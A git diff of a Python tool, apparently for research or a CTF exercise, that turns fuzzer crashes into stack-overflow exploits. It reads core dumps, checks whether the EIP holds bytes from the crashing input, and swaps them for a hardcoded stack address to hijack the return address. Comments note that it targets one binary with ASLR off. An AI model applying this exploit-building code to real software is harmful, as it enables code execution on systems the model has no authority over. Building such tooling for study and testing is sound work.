@@ -35,11 +35,11 @@ def reproducer(crash_input: bytes, arg_config: argparse.Namespace):
         stdin=subprocess.PIPE,
         stdout=subprocess.PIPE, 
         stderr=subprocess.PIPE, 
-        text=True
+        # text=True
     )
 
     #sending the crash input from stdin to all targets
-    rep_proc.communicate(input=crash_input.decode())
+    rep_proc.communicate(input=crash_input)
 
     if rep_proc.returncode == -11:  #segfault
         core_path = f"/core_dumps/core.{target_bin}.{rep_proc.pid}"
@@ -76,40 +76,43 @@ def root_cause_analysis(crash_input: bytes, arg_config: argparse.Namespace):
 
     command = build_command(arg_config, crash_input)
 
+    #env={**os.environ, **ENV_VARS} => merges the current env variables with the additional ENV_VARS
     crash_proc = subprocess.Popen(
         command,
         stdin=subprocess.PIPE,
         stdout=subprocess.PIPE, 
         stderr=subprocess.PIPE, 
-        text=True
+        env={**os.environ, **ENV_VARS}
+        # text=True
     )
 
     #sending the crash input from stdin to all targets
-    crash_proc.communicate(input=crash_input.decode())
+    crash_proc.communicate(input=crash_input)
 
     core_path = f"/core_dumps/core.{target_bin}.{crash_proc.pid}"
 
-    gdb_proc = subprocess.Popen(
-        [f"gdb -q {target_bin} {core_path}"], 
-        stdin=subprocess.PIPE, 
-        stdout=subprocess.PIPE, 
-        stderr=subprocess.PIPE, 
-        shell=True, 
-        text=True
-    )
+    # gdb_proc = subprocess.Popen(
+    #     [f"gdb -q {target_bin} {core_path}"], 
+    #     stdin=subprocess.PIPE, 
+    #     stdout=subprocess.PIPE, 
+    #     stderr=subprocess.PIPE, 
+    #     shell=True, 
+    #     text=True
+    # )
 
-    gdb_proc.stdin.write("info registers\n")
-    gdb_proc.stdin.flush()
+    # gdb_proc.stdin.write("info registers\n")
+    # gdb_proc.stdin.flush()
 
-    gdb_proc.stdin.write("q\n")
-    gdb_proc.stdin.write("y\n")
-    gdb_proc.stdin.flush()
+    # gdb_proc.stdin.write("q\n")
+    # gdb_proc.stdin.write("y\n")
+    # gdb_proc.stdin.flush()
 
-    output, _ = gdb_proc.communicate()
+    # output, _ = gdb_proc.communicate()
 
-    # print(f'from root cause analysis, output: {output}')
+    core = Corefile(core_path)
+    eip = core.eip.to_bytes(4, byteorder='little')
 
-    eip = extract_eip(output)
+    # eip = extract_eip(output)
 
     #if the value of the eip belongs to the crash input, it means it was overwritten by the crash input and the payload reached the return address
     if eip in crash_input:    
@@ -125,9 +128,30 @@ def crash_explorer(crash_input: bytes, arg_config: argparse.Namespace):
     Extracts information from the core dump from the previous crash and mutates the crashing input, 
     returns the mutated input to the root_cause_analysis for further crash testing.
     """
+
+    #this explorer only works for june with aslr off for the time being
     payload_mutation = []
 
+    core_files = glob.glob(f'/core_dumps/core.{arg_config.target}.*')
+    core_path = core_files[-1]
+
+    core = Corefile(core_path)
+
+    for register in core.registers:
+
+        reg_value = core.registers[register].to_bytes(4, byteorder='little')
+
+        if reg_value in crash_input:
+            print(f'{register} crashed with input bytes {reg_value}')
+
+            target = b'\xd0\xd0\xff\xff'
+
+            payload_mutation = crash_input.replace(reg_value, target)
+            print(f'payload mutation {payload_mutation}')
+
+
     return payload_mutation
+
 
 def payload_builder(crash_input: bytes, target_bin: str):
     """
@@ -152,6 +176,7 @@ def payload_builder(crash_input: bytes, target_bin: str):
 
     return
 
+
 def overwrite_ra(crash_input: bytes, target_bin: str, target_ra: bytes):
     """
     Rewrites a crashing input to replace the return address for EIP hijacking. 
@@ -167,25 +192,28 @@ def overwrite_ra(crash_input: bytes, target_bin: str, target_ra: bytes):
     core_files = glob.glob(f'/core_dumps/core.{target_bin}.*')
     core_path = core_files[-1]
 
-    gdb_proc = subprocess.Popen(
-        [f"gdb -q {target_bin} {core_path}"], 
-        stdin=subprocess.PIPE, 
-        stdout=subprocess.PIPE, 
-        stderr=subprocess.PIPE, 
-        shell=True, 
-        text=True
-    )
+    # gdb_proc = subprocess.Popen(
+    #     [f"gdb -q {target_bin} {core_path}"], 
+    #     stdin=subprocess.PIPE, 
+    #     stdout=subprocess.PIPE, 
+    #     stderr=subprocess.PIPE, 
+    #     shell=True, 
+    #     text=True
+    # )
 
-    gdb_proc.stdin.write("info registers\n")
-    gdb_proc.stdin.flush()
+    # gdb_proc.stdin.write("info registers\n")
+    # gdb_proc.stdin.flush()
 
-    gdb_proc.stdin.write("q\n")
-    gdb_proc.stdin.write("y\n")
-    gdb_proc.stdin.flush()
+    # gdb_proc.stdin.write("q\n")
+    # gdb_proc.stdin.write("y\n")
+    # gdb_proc.stdin.flush()
 
-    output, _ = gdb_proc.communicate()
+    # output, _ = gdb_proc.communicate()
 
-    eip = extract_eip(output)
+    # eip = extract_eip(output)
+
+    core = Corefile(core_path)
+    eip = core.eip.to_bytes(4, byteorder='little')
 
     if eip not in crash_input:
         logging.error('Houston we have a problem')
@@ -199,7 +227,7 @@ def extract_eip(core_output: str):
 
     eip_value = None
     for line in core_output.splitlines():
-        if "eip" in line:  # Find the line with 'eip'
+        if 'eip' in line:  # Find the line with 'eip'
             eip_value = line.split()[1]  # Extract the hexadecimal value (second column)
             break
 
@@ -211,59 +239,6 @@ def extract_eip(core_output: str):
     eip_bytes = eip_bytes[::-1] 
 
     return eip_bytes
-
-
-def locate_ra(pattern, target):
-
-    gdb_proc = subprocess.Popen(
-        [f"gdb -q {target}"], 
-        stdin=subprocess.PIPE, 
-        stdout=subprocess.PIPE, 
-        stderr=subprocess.PIPE, 
-        shell=True, 
-        text=True
-    )
-
-    #send the pattern to the gdb target proc from both the arguments and stdin 
-    #when I send commands from a script to gdb, 4 whitespaces (0x20202020) are added in the beginning of the buffer and it messes up the ra offset calculation!!!
-    commands = f"""
-    set pagination off
-    set disable-randomization off
-    r {pattern.decode('latin-1')}
-    {pattern.decode('latin-1')}
-    """
-
-    gdb_proc.stdin.write(commands)
-    gdb_proc.stdin.flush()
-
-    while True:
-        output = gdb_proc.stdout.readline()
-        if "Program received signal SIGSEGV" in output:
-            break
-
-    gdb_proc.stdin.write("info registers\n")
-    gdb_proc.stdin.flush()
-
-    gdb_proc.stdin.write("info frame\n")
-    gdb_proc.stdin.flush()
-
-    gdb_proc.stdin.write("x/40x $esp-1100\n")
-    gdb_proc.stdin.flush()
-
-    gdb_proc.stdin.write("q\n")
-    gdb_proc.stdin.write("y\n")
-    gdb_proc.stdin.flush()
-
-    output, _ = gdb_proc.communicate()
-    
-    eip_value = None
-    for line in output.splitlines():
-        if "eip" in line:  # Find the line with 'eip'
-            eip_value = line.split()[1]  # Extract the hexadecimal value (second column)
-            break
-
-    offset = cyclic_find(int(eip_value, 16))
-    return offset
 
 
 def target_ra(target_bin: str):
@@ -297,7 +272,6 @@ def target_ra(target_bin: str):
     return output
 
 
-
 def stack_middle_address(output):
 
     # Find the line containing the word "stack" and extract the address in the middle
@@ -318,3 +292,4 @@ def stack_middle_address(output):
     middle += 4  #all the addresses end in 00 and when this is concatenated in bytes in the payload, it starts with \x00 and terminates the payload. Adding 4 to avoid the \x00 sequence
 
     return middle
+
